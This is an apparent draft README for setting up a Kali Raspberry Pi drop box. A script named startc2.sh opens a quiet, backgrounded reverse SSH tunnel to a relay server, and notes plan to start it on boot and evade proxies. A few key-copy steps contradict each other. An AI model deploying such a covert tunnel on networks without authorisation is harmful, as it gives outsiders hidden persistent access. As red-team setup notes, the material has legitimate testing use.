# spi



## Preparation

On host, create two SSH keys - two each with a different passphrase (key_relay, key_admin), one without (key_pi)

    ssh-keygen





## Set up relay server using key_admin.pub. Assign a static IP address and assign to DNS name relay.domain.com

Connect to relay server over SSH using key_admin, change SSH port, and reconnect

    ssh -i /home/kali/.ssh/key_admin kali@relay.domain.com
    sudo apt update && sudo apt upgrade -y
    sudo nano /etc/ssh/sshd_config
      (Add a line for 'Port 2222' and save)
    sudo systemctl restart ssh
    exit
    ssh -i /home/kali/.ssh/key_admin kali@relay.domain.com -p 2222
    #create user pi, create /home/pi/.ssh, chown /home/pi and /home/pi/.ssh to new user, and copy key_pi.pub and key_relay.pub to authorized_keys




## Set up RPi

Format RPi with latest Kali ARM

Connect to RPi over SSH, change default password, and make a directory for the keys

    ssh kali@10.10.10.10 (password: kali)
    passwd
      (Change password)
    mkdir -p /home/kali/.ssh
    sudo apt update && sudo apt upgrade -y

Copy key_pi and key_relay.pub to RPi. Rename key_relay.pub -> authorized_keys

    scp key_pi kali@10.10.10.10:/home/kali/.ssh
    scp key_admin.pub kali@10.10.10.10:/home/kali/.ssh/authorized_keys
    
Connect to RPi over SSH using key_admin

    ssh -i /home/kali/.ssh/key_admin root@10.10.10.10
    echo "ssh -i /home/kali/.ssh/key_pi -R 9001 -f -C -q -N pi@relay.domain.com -p 2222" > /root/startc2.sh
    chmod 700 /root/startc2.sh
    echo "kill $(/usr/bin/ps aux | /usr/bin/grep ssh | /usr/bin/grep 2222 | /usr/bin/awk '{print $2}')" > /root/killc2.sh
    chmod 700 /root/killc2.sh
    # startc2 on boot
    # proxy awareness or https channel
    
    
    
    
    
    
    

    

TODO:
configure secure local login for pi


